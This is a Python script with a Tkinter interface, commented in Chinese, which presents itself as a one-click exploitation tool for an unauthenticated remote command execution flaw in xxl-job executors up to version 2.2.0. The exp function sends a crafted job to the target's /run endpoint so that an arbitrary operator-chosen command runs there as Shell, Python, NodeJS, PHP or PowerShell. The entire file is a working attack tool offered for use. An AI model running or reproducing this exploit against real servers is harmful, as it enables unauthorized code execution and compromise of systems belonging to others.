#xxl-job未授权加命令执行漏洞支持 =<v2.2.0版本
#支持脚本语言有Shell、Python、NodeJS、PHP、PowerShell
#windows推荐使用PowerShell,Linux推荐使用shell
#如果不行可尝试其它方式，前提是环境支持


import requests
import argparse
import time
import sys
import tkinter.messagebox
import tkinter as tk
from tkinter import ttk
import re


window = tk.Tk()
window.title('xxl-job rec一键利用工具')
window.geometry('650x400')
on_hit = False



proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
}


def exp(url,cmd,method):
    times = round(time.time() * 1000)
    method = method.upper()
    headers = {'X-Requested-With': 'XMLHttpRequest',
'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36',
'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
'Accept-Encoding': 'gzip, deflate'}
    data = '''{
  "jobId": 1,
  "executorHandler": "demoJobHandler",
  "executorParams": "demoJobHandler",
  "executorBlockStrategy": "COVER_EARLY",
  "executorTimeout": 0,
  "logId": 1,
  "logDateTime": 1586629003729,
  "glueType": "GLUE_'''+method+'''",
  "glueSource": "'''+cmd+'''",
  "glueUpdatetime":''' +str(times)+''',
  "broadcastIndex": 0,
  "broadcastTotal": 0
}'''


    try:
        response = requests.post(url=url+"/run",headers=headers,data=data)
        if response.status_code == 200:
            return ("commond excute success!")
        else:
            return ("access failed!")
    except:
        return ("This ip or domain cannot be connected!")

pattern = re.compile(r'^((2(5[0-5]|[0-4]\d))|[0-1]?\d{1,2})(\.((2(5[0-5]|[0-4]\d))|[0-1]?\d{1,2})){3}$')


def windows():
    def log():
        ipadderss = ipadderss_data.get()
        port = port_data.get()
        method = method_data.get()
        cmd = cmd_data.get()
        url = 'http://' + ipadderss + ':' + str(port)

        if ipadderss and port:
            if pattern.search(ipadderss):
                if 0 < int(port) < 65535:
                    result = exp(url, cmd, method)
                    log_text.insert('insert', time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())+'  http://'+ipadderss+':'+port +'  '+result+'\n')
                else:
                    log_text.insert('insert', time.strftime("%Y-%m-%d %H:%M:%S",
                                                            time.localtime()) + '  Port input error\n')
            else:
                log_text.insert('insert', time.strftime("%Y-%m-%d %H:%M:%S",
                                                        time.localtime()) + '  IPadderss input error\n')
        else:
            log_text.insert('insert',time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())+'  Please enter the full parameters\n')
    ipadderss = tk.StringVar()
    port = tk.StringVar()
    method = tk.StringVar()
    ipadderss_name = tk.Label(window, text='IP地址/域名：')
    port_name = tk.Label(window, text='端口：')
    ipadderss_data = tk.Entry(window,show=None,font=('microsoft yahei',10),width=21)
    port_data = tk.Entry(window,show=None,font=('microsoft yahei',10),width=5)
    port_name = tk.Label(window, text='端口：')
    method_name = tk.Label(window, text='脚本：')
    method_data = ttk.Combobox(window, width=12)
    method_data['values'] = ('Shell','Python','NodeJS','PHP','PowerShell')
    method_data.grid(column=1, row=1)
    method_data.current(4)
    cmd_name = tk.Label(window, text='命令：')
    cmd_data = tk.Entry(window,show=None,font=('microsoft yahei',10),width=45)
    button = tk.Button(window, text='执行',width=6, command=log)
    log_text = tk.Text(window)





    ipadderss_name.grid(row=1,column=0,padx=10)
    ipadderss_data.grid(row=1,column=1,padx=10)
    port_name.grid(row=1,column=2,padx=10)
    port_data.grid(row=1,column=3,padx=10,)
    method_name.grid(row=1,column=4,padx=10,)
    method_data.grid(row=1,column=5,padx=10)
    cmd_name.grid(row=2,column=0,padx=10,pady=10)
    cmd_data.grid(row=2,column=1,padx=10,columnspan=4,pady=10)
    button.grid(row=2,column=5)

    log_text.grid(row=3,column=0,columnspan=20)




windows()

tk.mainloop()